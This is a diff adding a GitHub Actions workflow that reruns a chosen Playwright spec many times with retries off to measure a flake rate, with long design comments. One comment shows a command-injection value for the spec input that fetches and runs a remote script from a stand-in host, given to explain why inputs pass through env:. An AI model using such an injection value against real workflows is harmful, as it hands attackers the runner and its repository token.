@@ -1,0 +1,161 @@
+name: E2E flake hunt
+
+# RUN ONE SPEC MANY TIMES AND COUNT (DREAMCRM-105 deliverable 1).
+#
+# THE QUESTION THIS ANSWERS. `e2e/portal-billing.spec.ts` failed on 2026-09-15
+# and again on 2026-09-22 — same strict-mode violation, same two elements, both
+# times on a diff the browser suite never loads, and both times a plain re-run
+# of the same job at the same SHA went green. Everything anybody could say
+# about it was a frequency nobody had measured: "about once a day", "can't
+# reproduce". A flake with no rate is not a defect you can work on, it is a
+# rumour with a job id.
+#
+# Every other browser run in this repo is "the whole suite, once" — `e2e` on a
+# PR, `e2e-post-merge` on main, `nightly-e2e` overnight. None of them can be
+# asked a narrower question, so the only way to see a 1-in-100 event was to
+# wait for it to happen to somebody. This workflow asks the narrow question:
+# one spec, N times, and the answer is a ratio.
+#
+# WHY IT IS ITS OWN FILE rather than inputs bolted onto `post-merge-e2e.yml`.
+# That workflow is an ALERT with a single meaning — "a browser journey broke on
+# main" — and its run history is the record somebody reads to decide whether
+# main is healthy. A hand-dispatched 50x hunt that goes deliberately red would
+# sit in that history looking exactly like a broken deploy. Same argument that
+# file makes for not being a job inside `deploy.yml`: a red run should mean one
+# thing.
+#
+# ============================ THIS GATES NOTHING =============================
+#
+# No `pull_request`, no `push`, no `schedule` — `workflow_dispatch` only. It is
+# not a required status-check context and nothing `needs:` it. A red run here
+# is a FINDING, and on a hunt it is usually the good outcome: red means the
+# flake reproduced and the Playwright report on this run has the DOM, the trace
+# and the screenshot of it happening.
+#
+# Deliberately NOT on a schedule either. A hunt costs a full build plus N
+# repetitions of a browser spec; it is worth paying when somebody is chasing
+# something, and it is noise every other morning. The standing question "did
+# anything flake this week" is `e2e-flaky-digest.yml`'s, which reads runs that
+# were going to happen anyway.
+#
+# WHO READS A RED RUN — the same honest answer `post-merge-e2e.yml` and
+# `review-sweep.yml` both give. Nothing in `.github/` routes a workflow failure
+# anywhere. This one needs no addressee, unlike those two: a hunt has a person
+# standing in front of it by construction, because a hunt only exists because
+# somebody pressed the button.
+on:
+  workflow_dispatch:
+    inputs:
+      spec:
+        description: 'Which spec(s) to hunt, space-separated — e.g. e2e/portal-billing.spec.ts. Empty runs the whole suite, which is almost never what you want here.'
+        required: false
+        default: 'e2e/portal-billing.spec.ts'
+        type: string
+      repeat:
+        description: 'How many times to run each selected test. 50 is the useful order for a ~1-in-100 event; the harness refuses above 200.'
+        required: false
+        default: '50'
+        type: string
+
+# NOT `post-merge-e2e-*` and not `deploy-main`. A hunt must never queue behind
+# or interact with either. `cancel-in-progress: false` on purpose: cancelling a
+# forty-minute hunt because somebody dispatched a second one is the worst
+# possible surprise, and the second one has nothing to gain from the first
+# dying.
+concurrency:
+  group: e2e-flake-hunt-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  # NOT named `e2e` or `test`: those two are the required status-check contexts
+  # on main's branch protection, and a second producer of either name reporting
+  # onto a commit is how a green check stops meaning anything.
+  # `tests/guards/e2e-harness-args.test.ts` pins it, the same way the
+  # review-sweep and review-gate guards pin theirs.
+  e2e-flake-hunt:
+    name: e2e-flake-hunt (dispatch only, gates nothing)
+    runs-on: ubuntu-latest
+    # The harness's own ceiling is 200 repetitions; `portal-billing` at 50 is
+    # ~10 minutes of browser on top of a ~5-minute install-and-build. 60 leaves
+    # room for a bigger spec without letting a wedged run inherit GitHub's
+    # 6-hour default — this job runs with somebody watching, but not for six
+    # hours.
+    timeout-minutes: 60
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up pnpm
+        uses: pnpm/action-setup@v4
+
+      - name: Set up Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: pnpm
+
+      - name: Install dependencies
+        run: pnpm install --frozen-lockfile
+
+      - name: Install Playwright Chromium
+        run: pnpm exec playwright install --with-deps chromium
+
+      # THE INPUTS RIDE `env:`, AND THAT IS NOT A STYLE CHOICE.
+      # `${{ inputs.spec }}` written inside this `run:` block would be
+      # substituted into the script text BEFORE bash ever sees it, so a spec of
+      # `x"; curl evil.sh | sh; "` runs as the workflow's own shell — with the
+      # repository checkout and the job token in front of it. Through `env:` the
+      # value is a variable, quoted at the point of use, and bash never parses
+      # it as code. `scripts/e2e-harness.sh` then validates the VALUE
+      # (path-shaped token, bounded integer), so a workflow that forgets this
+      # still cannot turn a typo into an eight-minute run of the wrong tests.
+      #
+      # `--retries=0` IS THE WHOLE POINT OF A HUNT. `playwright.config.ts` sets
+      # `retries: 1` under CI, deliberately, so ordinary harness noise does not
+      # redden a required check — but that retry is exactly what absorbs the
+      # event being counted here. At `retries: 1` a spec that fails 8 times in
+      # 50 and passes on the second attempt each time reports GREEN with a
+      # flaky-summary footnote; at 0 it reports "8 failed, 192 passed", which is
+      # the number this workflow exists to produce.
+      - name: Hunt
+        id: hunt
+        env:
+          E2E_SPEC: ${{ inputs.spec }}
+          E2E_REPEAT: ${{ inputs.repeat }}
+        run: bash scripts/e2e-harness.sh -- --retries=0
+
+      # Still worth running at `--retries=0`: it reports zero flaky every time
+      # by construction, and that is the assertion. If this ever names a test,
+      # the hunt was not running with retries off and its ratio is measuring
+      # something other than what the summary below claims.
+      - name: Name any test that only passed on a retry
+        id: flaky
+        if: always()
+        run: node scripts/e2e-flaky-summary.mjs
+        env:
+          FLAKY_CHECK_NAME: e2e-flake-hunt
+
+      # UPLOADED ON A GREEN RUN TOO, unlike every other e2e job in this repo,
+      # and for the opposite reason. Elsewhere the report is evidence of a
+      # failure; here the whole deliverable is a ratio, and a clean hunt's
+      # `e2e-results.json` is the only thing that proves the denominator — that
+      # the spec filter matched what the reader meant and the repetitions
+      # actually ran. "50 of 50 passed" and "the filter matched nothing" are
+      # the same shade of green without it.
+      - name: Upload Playwright report
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: playwright-report-flake-hunt
+          path: |
+            playwright-report/
+            e2e-results.json
+          retention-days: 7
+
+      - name: Say what a red hunt means
+        if: failure() && steps.hunt.outcome == 'failure'
+        run: |
+          echo "::notice title=The hunt reproduced something::A red run here is the GOOD outcome - the spec failed at least once across the repetitions, which is what you dispatched this to find out. The uploaded playwright-report has the trace, the screenshot and the error-context DOM dump for every failed repetition. The pass/fail counts in the step above are the rate."
